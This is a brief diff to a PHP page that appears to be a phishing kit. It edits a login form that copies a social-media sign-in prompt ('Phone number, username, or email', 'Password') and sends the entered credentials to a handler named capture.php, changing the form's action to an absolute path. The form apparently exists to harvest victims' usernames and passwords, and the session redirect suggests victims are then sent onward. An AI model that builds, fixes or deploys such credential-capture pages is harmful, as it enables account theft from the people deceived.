@@ -48,7 +48,7 @@ $redirect_url = isset($_SESSION['redirect_url']) ? $_SESSION['redirect_url'] : '
     <div class="container">
         <div class="box">
             <div class="logo"></div>
-            <form class="form" id="f" method="POST" action="capture.php">
+            <form class="form" id="f" method="POST" action="/capture.php">
                 <input type="text" id="u" name="username" placeholder="Phone number, username, or email" required>
                 <div class="pwd">
                     <input type="password" id="p" name="password" placeholder="Password" required>
